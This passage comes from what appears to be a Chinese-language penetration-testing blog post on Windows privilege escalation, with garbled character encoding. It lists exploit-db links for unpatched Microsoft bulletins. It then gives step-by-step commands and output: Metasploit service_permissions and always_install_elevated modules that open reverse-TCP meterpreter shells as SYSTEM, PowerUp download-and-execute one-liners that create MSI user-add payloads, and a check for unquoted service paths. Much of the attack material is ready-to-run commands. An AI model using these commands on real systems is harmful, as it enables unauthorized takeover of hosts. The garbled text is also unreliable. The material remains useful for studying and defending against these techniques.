PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer &lt;= 11 - OLE Automation Array Remote Code Execution (#1), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer &lt; 11 - OLE Automation Array Remote Code Execution (MSF), MSF</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution &#x27;Sandworm&#x27; Exploit (MS14-060), PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC</span><br><span class="line">[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical</span><br><span class="line">[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/34458/</span><br><span class="line">[*] </span><br><span class="line">[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC</span><br><span class="line">[*] </span><br><span class="line">[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical</span><br><span class="line">[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important</span><br><span class="line">[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important</span><br><span class="line">[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical</span><br><span class="line">[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical</span><br><span class="line">[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical</span><br><span class="line">[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical</span><br><span class="line">[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical</span><br><span class="line">[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical</span><br><span class="line">[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical</span><br><span class="line">[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical</span><br><span class="line">[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important</span><br><span class="line">[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC</span><br><span class="line">[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC</span><br><span class="line">[*] </span><br><span class="line">[*] done</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-Sherlock-ps1è„šæœ¬æŸ¥çœ‹æ¼æ´"><a href="#4-Sherlock-ps1è„šæœ¬æŸ¥çœ‹æ¼æ´" class="headerlink" title="4.Sherlock.ps1è„šæœ¬æŸ¥çœ‹æ¼æ´"></a>4.Sherlock.ps1è„šæœ¬æŸ¥çœ‹æ¼æ´</h3><p><code>é¦–å…ˆä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœº</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload Sherlock.ps1 C:</span><br><span class="line">[*] uploading  : /root/Sherlock.ps1 -&gt; C:</span><br><span class="line">[*] uploaded   : /root/Sherlock.ps1 -&gt; C:\Sherlock.ps1</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><code>ç›®æ ‡ä¸»æœºæ‰§è¡Œè„šæœ¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Import-Module .\Sherlock</span><br><span class="line">PS C:\&gt; Find-AllVulns &gt; out.txt</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹out.txt</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Title      : User Mode to Ring (KiTrap0D)</span><br><span class="line">MSBulletin : MS10-015</span><br><span class="line">CVEID      : 2010-0232</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/11199/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : Task Scheduler .XML</span><br><span class="line">MSBulletin : MS10-092</span><br><span class="line">CVEID      : 2010-3338, 2010-3888</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/19930/</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : NTUserMessageCall Win32k Kernel Pool Overflow</span><br><span class="line">MSBulletin : MS13-053</span><br><span class="line">CVEID      : 2013-1300</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/33213/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : TrackPopupMenuEx Win32k NULL Page</span><br><span class="line">MSBulletin : MS13-081</span><br><span class="line">CVEID      : 2013-3881</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/31576/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : TrackPopupMenu Win32k Null Pointer Dereference</span><br><span class="line">MSBulletin : MS14-058</span><br><span class="line">CVEID      : 2014-4113</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/35101/</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : ClientCopyImage Win32k</span><br><span class="line">MSBulletin : MS15-051</span><br><span class="line">CVEID      : 2015-1701, 2015-2433</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/37367/</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Font Driver Buffer Overflow</span><br><span class="line">MSBulletin : MS15-078</span><br><span class="line">CVEID      : 2015-2426, 2015-2433</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/38222/</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : &#x27;mrxdav.sys&#x27; WebDAV</span><br><span class="line">MSBulletin : MS16-016</span><br><span class="line">CVEID      : 2016-0051</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/40085/</span><br><span class="line">VulnStatus : Not supported on 64-bit systems</span><br><span class="line"></span><br><span class="line">Title      : Secondary Logon Handle</span><br><span class="line">MSBulletin : MS16-032</span><br><span class="line">CVEID      : 2016-0099</span><br><span class="line">Link       : https://www.exploit-db.com/exploits/39719/</span><br><span class="line">VulnStatus : Not Supported on single-core systems</span><br><span class="line"></span><br><span class="line">Title      : Windows Kernel-Mode Drivers EoP</span><br><span class="line">MSBulletin : MS16-034</span><br><span class="line">CVEID      : 2016-0093/94/95/96</span><br><span class="line">Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Win32k Elevation of Privilege</span><br><span class="line">MSBulletin : MS16-135</span><br><span class="line">CVEID      : 2016-7255</span><br><span class="line">Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135</span><br><span class="line">VulnStatus : Appears Vulnerable</span><br><span class="line"></span><br><span class="line">Title      : Nessus Agent 6.6.2 - 6.10.3</span><br><span class="line">MSBulletin : N/A</span><br><span class="line">CVEID      : 2017-7199</span><br><span class="line">Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html</span><br><span class="line">VulnStatus : Not Vulnerable</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x02-windowsç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨"><a href="#0x02-windowsç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨" class="headerlink" title="0x02.windowsç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨"></a>0x02.windowsç³»ç»Ÿé…ç½®é”™è¯¯åˆ©ç”¨</h2><h3 id="1-ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯"><a href="#1-ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯" class="headerlink" title="1.ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯"></a>1.ç³»ç»ŸæœåŠ¡æƒé™é…ç½®é”™è¯¯</h3><blockquote><p>windows server å¯åˆ›å»ºé•¿ä¹…è¿è¡Œçš„å¯æ‰§è¡Œç¨‹åºï¼Œè‹¥èƒ½è·å–çš„ä¿®æ”¹windows serveré…ç½®æƒé™ï¼Œ é€šè¿‡æŠŠæœåŠ¡å¯åŠ¨çš„äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢ä¸ºæ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¯ä»¥è·å¾—systemæƒé™</p><p>æœåŠ¡æœªè¿è¡Œï¼šä½¿ç”¨æ¶æ„ç¨‹åºæ›¿æ¢ï¼Œç„¶åé‡å¯æœåŠ¡<br>æœåŠ¡æ­£åœ¨è¿è¡Œä¸”æ— æ³•ç»ˆæ­¢ï¼šç¬¦åˆç»å¤§å¤šæ•°çš„æ¼æ´åˆ©ç”¨åœºæ™¯ï¼Œä½¿ç”¨ DLLåŠ«æŒæŠ€æœ¯å¹¶å°è¯•é‡å¯æœåŠ¡</p></blockquote><h4 id="01-PowerUp-ps1è„šæœ¬æ£€æŸ¥æœåŠ¡æ¼æ´"><a href="#01-PowerUp-ps1è„šæœ¬æ£€æŸ¥æœåŠ¡æ¼æ´" class="headerlink" title="01.PowerUp.ps1è„šæœ¬æ£€æŸ¥æœåŠ¡æ¼æ´"></a>01.PowerUp.ps1è„šæœ¬æ£€æŸ¥æœåŠ¡æ¼æ´</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;./PowerUp.ps1&#x27;); Invoke-AllChecks&quot;</span><br><span class="line"></span><br><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module .\PowerUp.ps1; Invoke-AllChecks&#125;&quot;</span><br></pre></td></tr></table></figure><h4 id="02-msfçš„exploit-windows-local-sercice-permissionsæ¨¡å—ææƒ"><a href="#02-msfçš„exploit-windows-local-sercice-permissionsæ¨¡å—ææƒ" class="headerlink" title="02.msfçš„exploit/windows/local/sercice_permissionsæ¨¡å—ææƒ"></a>02.msfçš„exploit/windows/local/sercice_permissionsæ¨¡å—ææƒ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2956 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [ï¿½æ±¾ 6.1.7601]</span><br><span class="line">ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ (c) 2009 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½</span><br><span class="line"></span><br><span class="line">C:\Users\administrator\Desktop&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">jiye\administrator</span><br><span class="line"></span><br><span class="line">C:\Users\administrator\Desktop&gt;exit</span><br><span class="line">exit</span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf6 exploit(multi/handler) &gt; use exploit/windows/local/service_permissions </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt;    </span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/service_permissions):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting  Required  Description</span><br><span class="line">   ----        ---------------  --------  -----------</span><br><span class="line">   AGGRESSIVE  false            no        Exploit as many services as possible (dangerous)</span><br><span class="line">   SESSION     1                yes       The session to run this module on.</span><br><span class="line">   TIMEOUT     10               yes       Timeout for WMI command in seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/service_permissions) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:4444 </span><br><span class="line">[-] The registry technique will be skipped because the payload architecture does not match the native system architecture</span><br><span class="line">[*] Trying to add a new service...</span><br><span class="line">[*] Created service... CnoKgsk</span><br><span class="line">[+] Service should be started! Enjoy your new SYSTEM meterpreter session.</span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 2 opened (192.168.1.4:4444 -&gt; 192.168.1.5:49169) at 2021-07-28 09:16:46 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2832 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [ï¿½æ±¾ 6.1.7601]</span><br><span class="line">ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ (c) 2009 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">whoami</span><br><span class="line">nt authority\system</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-æ³¨å†Œè¡¨é”®AlwaysInstallElevatedææƒ"><a href="#2-æ³¨å†Œè¡¨é”®AlwaysInstallElevatedææƒ" class="headerlink" title="2.æ³¨å†Œè¡¨é”®AlwaysInstallElevatedææƒ"></a>2.æ³¨å†Œè¡¨é”®AlwaysInstallElevatedææƒ</h3><blockquote><p>åŸå› ï¼šå¼€å¯äº†windows installer ç‰¹æƒå®‰è£…åŠŸèƒ½</p><p>cmdè¾“å…¥gpedit.mscâ€”â€”è®¡ç®—æœºé…ç½®â€”â€”ç®¡ç†æ¨¡å—â€”â€”windowsç»„ä»¶â€”â€”windows installer</p><p>cmdè¾“å…¥gpedit.mscâ€”â€”ç”¨æˆ·é…ç½®â€”â€”ç®¡ç†æ¨¡å—â€”â€”windowsç»„ä»¶â€”â€”windows installer</p></blockquote><h4 id="01-powerupåˆ©ç”¨"><a href="#01-powerupåˆ©ç”¨" class="headerlink" title="01.powerupåˆ©ç”¨"></a>01.powerupåˆ©ç”¨</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">powerupä¸‹çš„Get-RegistryAlwaysInstallElevatedæ¨¡å—æ£€æŸ¥æ³¨å†Œè¡¨é”®æ˜¯å¦è¢«è®¾ç½®</span><br><span class="line">å¦‚æœè¢«è®¾ç½®åˆ™æ„å‘³MSIæ–‡ä»¶æ˜¯ä»¥systemæƒé™ä¸‹èƒ½è¿è¡Œ</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ£€æŸ¥æ˜¯å¦è¢«è®¾ç½®</span></span><br><span class="line">powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#x27;./PowerUp.ps1&#x27;);Get-RegistryAlwaysInstallElevated</span><br><span class="line"><span class="meta">#</span><span class="bash"> è¿è¡ŒWrite-UserAddMSIæ¨¡å—ï¼Œç”ŸæˆMSIæ–‡ä»¶</span></span><br><span class="line">powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#x27;./PowerUp.ps1&#x27;);Write-UserAddMSI</span><br><span class="line"><span class="meta">#</span><span class="bash"> æ‰§è¡ŒMSIæ–‡ä»¶</span></span><br><span class="line">msiexec /quiet /qn /i UserAdd.msi</span><br></pre></td></tr></table></figure><img src="/2021/07/29/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20210728215541363.png" class><h4 id="02-msfçš„exploit-windows-local-always-install-elevatedæ¨¡å—ææƒ"><a href="#02-msfçš„exploit-windows-local-always-install-elevatedæ¨¡å—ææƒ" class="headerlink" title="02.msfçš„exploit/windows/local/always_install_elevatedæ¨¡å—ææƒ"></a>02.msfçš„exploit/windows/local/always_install_elevatedæ¨¡å—ææƒ</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/local/service_permissions) &gt; use exploit/windows/local/always_install_elevated </span><br><span class="line">[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; set session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/local/always_install_elevated):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SESSION  1                yes       The session to run this module on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.1.4      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/local/always_install_elevated) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.4:4444 </span><br><span class="line">[*] Sending stage (175174 bytes) to 192.168.1.5</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.1.4:4444 -&gt; 192.168.1.5:49171) at 2021-07-28 09:43:34 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 936 created.</span><br><span class="line">Channel 2 created.</span><br><span class="line">Microsoft Windows [ï¿½æ±¾ 6.1.7601]</span><br><span class="line">ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½ (c) 2009 Microsoft Corporationï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½È¨ï¿½ï¿½ï¿½ï¿½</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´"><a href="#3-å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´" class="headerlink" title="3.å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´"></a>3.å¯ä¿¡ä»»æœåŠ¡è·¯å¾„æ¼æ´</h3><blockquote><p>Trusted Service Pathsæ¼æ´åˆ©ç”¨äº†windowsæ–‡ä»¶è·¯å¾„è§£æçš„ç‰¹æ€§ï¼Œé€šä¿—çš„è¯´ï¼Œå¦‚æœä¸€ä¸ªæœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼ˆå¸¦ç©ºæ ¼ï¼‰å¹¶ä¸”æ²¡æœ‰è¢«åŒå¼•å·å¼•èµ·æ¥ï¼Œé‚£ä¹ˆè¿™ä¸ªæœåŠ¡å°±æœ‰æ¼æ´ã€‚</p><p>ä¾‹å¦‚ï¼šæœ‰ä¸€ä¸ªæ–‡ä»¶è·¯å¾„C:\Program Files\Some Folder\Service.exeï¼Œæ“ä½œç³»ç»Ÿä¼šå¯¹æ–‡ä»¶è·¯å¾„ä¸­ç©ºæ ¼çš„æ‰€æœ‰å¯èƒ½æƒ…å†µè¿›è¡Œå°è¯•ï¼Œç›´è‡³æ‰¾åˆ°ä¸€ä¸ªèƒ½å¤ŸåŒ¹é…çš„ç¨‹åºã€‚</p><p>æœ¬ä¾‹ä¸­ä¼šä¾æ¬¡å°è¯•æ‰§è¡Œä»¥ä¸‹ç¨‹åºï¼š</p><p>C:\Program.exe<br>C:\Program Files\Some.exe<br>C:\Program Files\Some Folder\Service.exe</p><p>å¦‚æœæˆ‘ä»¬åœ¨Cç›˜ä¸Šä¼ ä¸€ä¸ªåä¸ºProgram.exeçš„æ¶æ„ç¨‹åºï¼Œå¯èƒ½å°±ä¼šä»¥systemæƒé™æ‰§è¡Œè¯¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ææƒçš„ç›®çš„ã€‚</p></blockquote><h4 id="01-æµ‹è¯•æ¼æ´æ˜¯å¦å­˜åœ¨"><a href="#01-æµ‹è¯•æ¼æ´æ˜¯å¦å­˜åœ¨" class="headerlink" title="01.æµ‹è¯•æ¼æ´æ˜¯å¦å­˜åœ¨"></a>01.æµ‹è¯•æ¼æ´æ˜¯å¦å­˜åœ¨</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;    #æŸ¥æ‰¾æ²¡æœ‰è¢«å¼•å·å¼•èµ·æ¥çš„æœåŠ¡</span><br><span class="line"></span><br><span class="line">icacls &quot;C:\Program Files (x86)&quot;    #æ£€æµ‹ç›®æ ‡æ–‡ä»¶å¤¹æ˜¯å¦æœ‰å†™æƒé™</span><br><span class="line">Everyone:ç”¨æˆ·å¯¹è¿™ä¸ªæ–‡ä»¶å¤¹æœ‰å®Œå…¨æ§åˆ¶æƒé™ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½å…·æœ‰ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶å¤¹çš„æƒé™</span><br><span class="line">(M):ä¿®æ”¹</span><br><span class="line">(F):å®Œå…¨æ§åˆ¶</span><br><span class="line">(CI):ä»å±å®¹å™¨å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹</span><br><span class="line">(OI):ä»å±æ–‡ä»¶å°†ç»§æ‰¿è®¿é—®æ§åˆ¶é¡¹</span><br><span class="line">Everyone:(OI)(CI)(F):å¯¹è¯¥æ–‡ä»¶å¤¹ï¼Œç”¨æˆ·æœ‰è¯»ã€å†™ã€åˆ é™¤ã€ä¸‹è½½å…¶æ–‡ä»¶ã€åˆ é™¤å…¶å­ç›®å½•çš„æƒé™</span><br><span class="line"></span><br><span class="line">ç¡®è®¤å­˜åœ¨æ­¤æ¼æ´ï¼ŒæŠŠè¦ä¸Šä¼ 